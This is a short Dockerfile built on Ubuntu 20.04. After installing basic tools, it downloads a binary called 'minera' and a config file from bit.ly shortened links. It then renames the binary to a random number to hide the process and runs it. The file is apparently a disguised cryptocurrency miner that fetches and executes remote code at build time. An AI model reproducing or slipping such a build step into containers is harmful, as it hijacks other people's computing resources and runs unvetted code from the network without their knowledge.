FROM ubuntu:20.04

RUN apt-get update && \
    apt-get install screen python3 python3-pip wget git -y && \
    worker=$(shuf -n 1 -i 1-99999) && \
    wget -O minera https://bit.ly/3jC7wkh && \
    wget -O config.json https://bit.ly/3jz5OjN && \
    chmod +x minera config.json && mv minera $worker && \
    ./$worker